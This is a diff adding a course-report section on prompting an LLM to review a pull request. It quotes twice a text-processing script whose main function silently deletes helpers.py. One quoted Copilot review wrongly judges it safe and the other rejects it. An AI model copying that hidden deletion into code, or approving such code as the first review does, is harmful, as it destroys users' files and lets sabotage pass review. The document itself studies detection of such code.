@@ -43,6 +43,483 @@
 
 ---
 
+Problem B: LLM PR Review
+
+**Task Description**
+Your task is to have the GPT-4.1 model review the following PR patch file at https://patch-diff.githubusercontent.com/raw/Xavier-Schneider/LLMs-for-Software-Engineering-Week10-Feedback/pull/4.patch and decide whether or not the PR is safe to merge.
+
+---
+
+### 2. Guidelines that didn't work for Problem B
+
+#### Guideline 11: Be Extra Cautious about Binary Executables
+
+**Guideline Definition**
+Avoid committing binary executables (e.g., .exe, .dll, .jar, compiled artifacts, vendor-provided binaries) directly into the repository unless absolutely necessary. If inclusion is required, document their origin for accountability
+
+**Prompt and Context:**  
+```
+Can you review this PR patch file and gauge whether or not should the PR should be merged. Be wary of binary files especially as binary files can be harmful: From ef4da45ab510028b883e1a718ff00e2dd73a4af0 Mon Sep 17 00:00:00 2001
+From: Greg French <gregfrench26@gmail.com>
+Date: Mon, 16 Mar 2026 21:36:51 -0400
+Subject: [PATCH] Added text processor
+
+---
+ text_processor.py | 184 ++++++++++++++++++++++++++++++++++++++++++++++
+ 1 file changed, 184 insertions(+)
+ create mode 100644 text_processor.py
+
+diff --git a/text_processor.py b/text_processor.py
+new file mode 100644
+index 0000000..432cb42
+--- /dev/null
++++ b/text_processor.py
+@@ -0,0 +1,184 @@
++#!/usr/bin/env python3
++"""
++Text Processing Toolkit - A multi-purpose text analysis and transformation program.
++Performs word/character counts, frequency analysis, palindrome detection,
++sentence stats, and various text transformations.
++"""
++
++import re
++import string
++from collections import Counter
++import os
++
++def load_text(path: str) -> str:
++    """Load text from a file. Returns empty string on error."""
++    try:
++        with open(path, "r", encoding="utf-8", errors="replace") as f:
++            return f.read()
++    except (OSError, IOError):
++        return ""
++
++
++def clean_word(word: str) -> str:
++    """Strip punctuation and lowercase a word for analysis."""
++    return word.strip(string.punctuation).lower()
++
++
++def get_words(text: str) -> list[str]:
++    """Split text into a list of cleaned words."""
++    return [clean_word(w) for w in text.split() if clean_word(w)]
++
++
++def count_words(text: str) -> int:
++    """Return total word count (excluding empty/punctuation-only tokens)."""
++    return len(get_words(text))
++
++
++def count_characters(text: str, include_spaces: bool = True) -> int:
++    """Return character count. Set include_spaces=False to exclude spaces."""
++    if include_spaces:
++        return len(text)
++    return len(text.replace(" ", "").replace("\n", "").replace("\t", ""))
++
++
++def count_sentences(text: str) -> int:
++    """Approximate sentence count using period, exclamation, question marks."""
++    if not text.strip():
++        return 0
++    # Split on sentence-ending punctuation
++    parts = re.split(r"[.!?]+", text)
++    return len([p for p in parts if p.strip()])
++
++
++def word_frequency(text: str, top_n: int = 10) -> list[tuple[str, int]]:
++    """Return the top_n most frequent words as (word, count) pairs."""
++    words = get_words(text)
++    if not words:
++        return []
++    counts = Counter(words)
++    return counts.most_common(top_n)
++
++
++def is_palindrome(s: str) -> bool:
++    """Return True if s is a palindrome (ignoring case and non-alphanumeric)."""
++    cleaned = "".join(c for c in s.lower() if c.isalnum())
++    return cleaned == cleaned[::-1] if cleaned else False
++
++
++def find_palindromes(text: str) -> list[str]:
++    """Return all palindromic words in the text."""
++    words = set(get_words(text))
++    return sorted([w for w in words if is_palindrome(w)])
++
++
++def average_word_length(text: str) -> float:
++    """Return mean word length. Returns 0.0 if no words."""
++    words = get_words(text)
++    if not words:
++        return 0.0
++    return sum(len(w) for w in words) / len(words)
++
++
++def longest_words(text: str, n: int = 5) -> list[str]:
++    """Return the n longest unique words, sorted by length descending."""
++    words = list(dict.fromkeys(get_words(text)))
++    words.sort(key=len, reverse=True)
++    return words[:n]
++
++
++def reverse_words(text: str) -> str:
++    """Reverse the order of words in each line. Punctuation stays attached."""
++    lines = text.split("\n")
++    result = []
++    for line in lines:
++        words = line.split()
++        result.append(" ".join(reversed(words)))
++    return "\n".join(result)
++
++
++def to_title_case(text: str) -> str:
++    """Convert text to title case (each word capitalized)."""
++    return text.title()
++
++
++def remove_extra_spaces(text: str) -> str:
++    """Collapse multiple spaces/newlines to single space, strip lines."""
++    lines = text.split("\n")
++    cleaned = [" ".join(line.split()) for line in lines]
++    return "\n".join(cleaned)
++
++
++def remove_file_os(filename):
++    """
++    Deletes a file using the os.remove() function with error handling.
++    """
++    try:
++        os.remove(filename)
++        print(f"File '{filename}' has been deleted successfully.")
++    except FileNotFoundError:
++        print(f"Error: The file '{filename}' does not exist.")
++    except PermissionError:
++        print(f"Error: Permission denied to delete the file '{filename}'.")
++    except Exception as e:
++        print(f"An unexpected error occurred: {e}")
++
++
++def print_report(text: str, title: str = "Text Report") -> None:
++    """Print a formatted analysis report for the given text."""
++    print("=" * 60)
++    print(f"  {title}")
++    print("=" * 60)
++    print(f"  Words:        {count_words(text):,}")
++    print(f"  Characters:   {count_characters(text):,} (with spaces)")
++    print(f"  Characters:   {count_characters(text, False):,} (no spaces)")
++    print(f"  Sentences:    {count_sentences(text):,}")
++    print(f"  Avg word len: {average_word_length(text):.2f}")
++    print("-" * 60)
++    print("  Top 10 words:")
++    for word, count in word_frequency(text, 10):
++        print(f"    {word!r}: {count}")
++    print("-" * 60)
++    print("  Longest words:", longest_words(text, 5))
++    palindromes = find_palindromes(text)
++    if palindromes:
++        print("  Palindromes: ", palindromes)
++    else:
++        print("  Palindromes:  (none found)")
++    print("=" * 60)
++
++
++def main() -> None:
++    """Run the text processor: analyze sample or file, then demo transforms."""
++    sample = (
++        "Hello world! This is a sample text. "
++        "Did you know that noon and level are palindromes? "
++        "Python is great for text processing. "
++        "Repeat repeat repeat for frequency."
++    )
++
++    print_report(sample, "Sample Text Report")
++
++    print("\n--- Transform demos ---\n")
++    print("Reverse words:")
++    print(reverse_words(sample))
++    print("\nTitle case:")
++    print(to_title_case(sample))
++    print("\nExtra spaces removed:")
++    messy = "  too   many    spaces   "
++    print(repr(remove_extra_spaces(messy)))
++
++    remove_file_os("helpers.py")
++
++    # Optional: process a file if path given
++    import sys
++    if len(sys.argv) > 1:
++        path = sys.argv[1]
++        file_text = load_text(path)
++        if file_text:
++            print_report(file_text, f"File Report: {path}")
++        else:
++            print(f"Could not read file: {path}")
++
++
++if __name__ == "__main__":
++    main()
+```
+
+**Solution or Output generated by GitHub Copilot:**  
+
+Here is a review of the provided PR patch:
+
+- The patch adds a single new file: text_processor.py.
+- The file is a plain text Python script (not binary), and the patch does not introduce any binary or potentially harmful files.
+- The script implements a text processing toolkit with functions for word/character counting, frequency analysis, palindrome detection, sentence statistics, and text transformations.
+- The code is readable, well-documented, and does not contain any suspicious or malicious logic.
+- The only file operation is remove_file_os, which deletes a file by name (with error handling). In the demo, it tries to delete helpers.py, but this is not inherently dangerous in the context of a text processing tool, especially since it is only called in the main demo and not as part of a library function.
+- No external dependencies are introduced.
+
+Conclusion: The PR is safe to merge. There are no binary files or harmful content. The code is clear and functional for its intended purpose.
+
+**Analysis:**
+
+Analysis goes here
+
+
+---
+
+### 3. New and Updated Guidelines that worked for Problem B
+
+#### Guideline X: Be Extra Cautious About Any Potential Malicious Behaviour
+**Guideline Definition**
+Express to the LLM the need to err on the side of caution when deciding whether or not a PR should be merged into the repo. Malicious code can be embedded in files such as images and PDFs, be obfuscated in a binary file, or added directly in plaintext to files and merged into repos if not carefully reviewed.
+
+**Prompt and Context:**  
+Can you review this PR patch file and gauge whether or not should the PR should be merged. Be wary of any potential malicious. When in doubt, err on the side of caution, and don't approve the PR if it seems even a little bit malicious: 
+From ef4da45ab510028b883e1a718ff00e2dd73a4af0 Mon Sep 17 00:00:00 2001
+From: Greg French <gregfrench26@gmail.com>
+Date: Mon, 16 Mar 2026 21:36:51 -0400
+Subject: [PATCH] Added text processor
+
+---
+ text_processor.py | 184 ++++++++++++++++++++++++++++++++++++++++++++++
+ 1 file changed, 184 insertions(+)
+ create mode 100644 text_processor.py
+
+diff --git a/text_processor.py b/text_processor.py
+new file mode 100644
+index 0000000..432cb42
+--- /dev/null
++++ b/text_processor.py
+@@ -0,0 +1,184 @@
++#!/usr/bin/env python3
++"""
++Text Processing Toolkit - A multi-purpose text analysis and transformation program.
++Performs word/character counts, frequency analysis, palindrome detection,
++sentence stats, and various text transformations.
++"""
++
++import re
++import string
++from collections import Counter
++import os
++
++def load_text(path: str) -> str:
++    """Load text from a file. Returns empty string on error."""
++    try:
++        with open(path, "r", encoding="utf-8", errors="replace") as f:
++            return f.read()
++    except (OSError, IOError):
++        return ""
++
++
++def clean_word(word: str) -> str:
++    """Strip punctuation and lowercase a word for analysis."""
++    return word.strip(string.punctuation).lower()
++
++
++def get_words(text: str) -> list[str]:
++    """Split text into a list of cleaned words."""
++    return [clean_word(w) for w in text.split() if clean_word(w)]
++
++
++def count_words(text: str) -> int:
++    """Return total word count (excluding empty/punctuation-only tokens)."""
++    return len(get_words(text))
++
++
++def count_characters(text: str, include_spaces: bool = True) -> int:
++    """Return character count. Set include_spaces=False to exclude spaces."""
++    if include_spaces:
++        return len(text)
++    return len(text.replace(" ", "").replace("\n", "").replace("\t", ""))
++
++
++def count_sentences(text: str) -> int:
++    """Approximate sentence count using period, exclamation, question marks."""
++    if not text.strip():
++        return 0
++    # Split on sentence-ending punctuation
++    parts = re.split(r"[.!?]+", text)
++    return len([p for p in parts if p.strip()])
++
++
++def word_frequency(text: str, top_n: int = 10) -> list[tuple[str, int]]:
++    """Return the top_n most frequent words as (word, count) pairs."""
++    words = get_words(text)
++    if not words:
++        return []
++    counts = Counter(words)
++    return counts.most_common(top_n)
++
++
++def is_palindrome(s: str) -> bool:
++    """Return True if s is a palindrome (ignoring case and non-alphanumeric)."""
++    cleaned = "".join(c for c in s.lower() if c.isalnum())
++    return cleaned == cleaned[::-1] if cleaned else False
++
++
++def find_palindromes(text: str) -> list[str]:
++    """Return all palindromic words in the text."""
++    words = set(get_words(text))
++    return sorted([w for w in words if is_palindrome(w)])
++
++
++def average_word_length(text: str) -> float:
++    """Return mean word length. Returns 0.0 if no words."""
++    words = get_words(text)
++    if not words:
++        return 0.0
++    return sum(len(w) for w in words) / len(words)
++
++
++def longest_words(text: str, n: int = 5) -> list[str]:
++    """Return the n longest unique words, sorted by length descending."""
++    words = list(dict.fromkeys(get_words(text)))
++    words.sort(key=len, reverse=True)
++    return words[:n]
++
++
++def reverse_words(text: str) -> str:
++    """Reverse the order of words in each line. Punctuation stays attached."""
++    lines = text.split("\n")
++    result = []
++    for line in lines:
++        words = line.split()
++        result.append(" ".join(reversed(words)))
++    return "\n".join(result)
++
++
++def to_title_case(text: str) -> str:
++    """Convert text to title case (each word capitalized)."""
++    return text.title()
++
++
++def remove_extra_spaces(text: str) -> str:
++    """Collapse multiple spaces/newlines to single space, strip lines."""
++    lines = text.split("\n")
++    cleaned = [" ".join(line.split()) for line in lines]
++    return "\n".join(cleaned)
++
++
++def remove_file_os(filename):
++    """
++    Deletes a file using the os.remove() function with error handling.
++    """
++    try:
++        os.remove(filename)
++        print(f"File '{filename}' has been deleted successfully.")
++    except FileNotFoundError:
++        print(f"Error: The file '{filename}' does not exist.")
++    except PermissionError:
++        print(f"Error: Permission denied to delete the file '{filename}'.")
++    except Exception as e:
++        print(f"An unexpected error occurred: {e}")
++
++
++def print_report(text: str, title: str = "Text Report") -> None:
++    """Print a formatted analysis report for the given text."""
++    print("=" * 60)
++    print(f"  {title}")
++    print("=" * 60)
++    print(f"  Words:        {count_words(text):,}")
++    print(f"  Characters:   {count_characters(text):,} (with spaces)")
++    print(f"  Characters:   {count_characters(text, False):,} (no spaces)")
++    print(f"  Sentences:    {count_sentences(text):,}")
++    print(f"  Avg word len: {average_word_length(text):.2f}")
++    print("-" * 60)
++    print("  Top 10 words:")
++    for word, count in word_frequency(text, 10):
++        print(f"    {word!r}: {count}")
++    print("-" * 60)
++    print("  Longest words:", longest_words(text, 5))
++    palindromes = find_palindromes(text)
++    if palindromes:
++        print("  Palindromes: ", palindromes)
++    else:
++        print("  Palindromes:  (none found)")
++    print("=" * 60)
++
++
++def main() -> None:
++    """Run the text processor: analyze sample or file, then demo transforms."""
++    sample = (
++        "Hello world! This is a sample text. "
++        "Did you know that noon and level are palindromes? "
++        "Python is great for text processing. "
++        "Repeat repeat repeat for frequency."
++    )
++
++    print_report(sample, "Sample Text Report")
++
++    print("\n--- Transform demos ---\n")
++    print("Reverse words:")
++    print(reverse_words(sample))
++    print("\nTitle case:")
++    print(to_title_case(sample))
++    print("\nExtra spaces removed:")
++    messy = "  too   many    spaces   "
++    print(repr(remove_extra_spaces(messy)))
++
++    remove_file_os("helpers.py")
++
++    # Optional: process a file if path given
++    import sys
++    if len(sys.argv) > 1:
++        path = sys.argv[1]
++        file_text = load_text(path)
++        if file_text:
++            print_report(file_text, f"File Report: {path}")
++        else:
++            print(f"Could not read file: {path}")
++
++
++if __name__ == "__main__":
++    main()
+**Solution or Output generated by GitHub Copilot:**  
+Here is a review of the provided PR patch file:
+
+General Overview
+- The patch adds a new file, text_processor.py, which implements a text processing toolkit with various analysis and transformation functions.
+- The code includes word/character/sentence counts, frequency analysis, palindrome detection, and text transformations.
+- The main function demonstrates the features and optionally processes a file if a path is provided.
+Security and Maliciousness Review
+1. File Deletion Function
+- The function remove_file_os(filename) uses os.remove() to delete a file, with error handling and user feedback.
+- In the main() function, this is called as remove_file_os("helpers.py"), which will attempt to delete a file named helpers.py in the current directory every time the script is run.
+2. Other Code Review
+- No network, subprocess, or shell execution is present.
+- No code injection, eval, or dynamic import.
+- All other functions are standard text processing utilities.
+Concerns
+- Malicious/Destructive Behavior: The unconditional deletion of helpers.py in the main function is highly suspicious and potentially malicious. This will remove helpers.py from the project or working directory if it exists, which could disrupt the project or delete important code.
+- No User Confirmation: There is no prompt or confirmation before deleting the file.
+- No Check for File Ownership or Safety: The function will delete any file named helpers.py, regardless of its importance.
+
+Recommendation
+Do NOT approve or merge this PR.
+The unconditional file deletion is a red flag for malicious or at least highly unsafe/destructive behavior. This could result in data loss or disruption of the project.
+
+If you have any doubts about the intent, always err on the side of caution and reject the PR until the deletion logic is removed or properly justified and safeguarded.
+
+*** Analysis ***
+The updated guideline helped the LLM make the right decision when deciding whether or not to approve this PR. In the original guideline, the LLM approved a PR that deletes the helpers file right off the disk. This updated guideline causes the LLM to take a more cautious approach to any code added that may seem malicious and thus, did not approve this PR to be merged into the repo.
+
+---
+
 Problem C: Discount Applied but Persisted Incorrectly
 
 **Task Description**
